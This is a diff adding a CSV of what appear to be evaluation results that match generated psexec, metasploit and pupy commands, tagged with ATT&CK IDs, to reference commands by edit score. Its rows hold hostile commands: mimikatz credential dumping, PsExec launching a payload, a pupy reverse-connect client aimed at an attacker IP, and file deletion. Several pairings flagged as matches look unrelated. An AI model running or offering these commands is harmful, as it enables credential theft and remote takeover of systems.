@@ -1,0 +1,45 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_metasploit_TA0002_T1203.txt,metasploit,msfconsole -r exploit.rb,`sudo msfconsole`,0.488,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \-u <valid_domain_user> \-p <password> \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.351,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \-u <domain>\user1 \-p <password> \-s \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.37,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \-u <domain>\user2 \-p <password> -i 0 \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.386,True
+command_psexec_TA0001_T1078.txt,psexec,psexec \-u <domain>\admin \-p <password> -s -e \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.341,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Administrator,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.244,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\user1 -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.311,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -s,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.167,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\User2 -w C:\Path\To\Working\Directory,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.287,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -r ServiceName -i 0,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.191,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -e -f C:\Path\To\File.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.084,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -l -v C:\Path\To\File.txt,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.214,True
+command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -h -u Domain\Administrator,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.259,True
+command_pupy_TA0004_T1055.txt,pupy,run memory_exec /usr/share/mimikatz/Win32/mimikatz.exe privilege::debug sekurlsa::logonPasswords exit,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.129,True
+command_pupy_TA0004_T1055.txt,pupy,run Beroot --bg,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.19,True
+command_pupy_TA0004_T1055.txt,pupy,download C:\\Windows\\System32\\svchost.exe,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.321,True
+command_pupy_TA0004_T1134.txt,pupy,beroot,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.107,True
+command_pupy_TA0004_T1134.txt,pupy,privesc_checker -s <os_type> -f <file_path>,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.214,True
+command_pupy_TA0005_T1055.txt,pupy,run memory_exec C:\\Windows\\System32\\svchost.exe privilege::debug,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.276,True
+command_pupy_TA0005_T1070.txt,pupy,pupy <file_path> rm -rf,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.239,True
+command_pupy_TA0005_T1070.txt,pupy,pupy <directory_path> rm -r,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.25,True
+command_pupy_TA0005_T1070.txt,pupy,pupy find /path/to/directory/ -type f -exec rm {} \;,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.252,True
+command_pupy_TA0005_T1134.txt,pupy,beroot,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.107,True
+command_pupy_TA0005_T1134.txt,pupy,privesc_checker <os_type>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.19,True
+command_pupy_TA0005_T1134.txt,pupy,sudo_alias <sudo_command>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.155,True
+command_pupy_TA0005_T1134.txt,pupy,bypassuac <admin_privilege_required>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.193,True
+command_pupy_TA0005_T1134.txt,pupy,getsystem <windows_system_privilege>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.252,True
+command_pupy_TA0005_T1134.txt,pupy,lazagne <target_directory>,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.189,True
+command_pupy_TA0005_T1134.txt,pupy,creddump <target_directory>,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.188,True
+command_pupy_TA0005_T1134.txt,pupy,hashmon <process_memory>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.235,True
+command_pupy_TA0005_T1134.txt,pupy,loot_memory <browser_process>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.224,True
+command_pupy_TA0005_T1134.txt,pupy,run memory_exec /usr/share/mimikatz/Win32/mimikatz.exe privilege::debug sekurlsa::logonPasswords exit,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.129,True
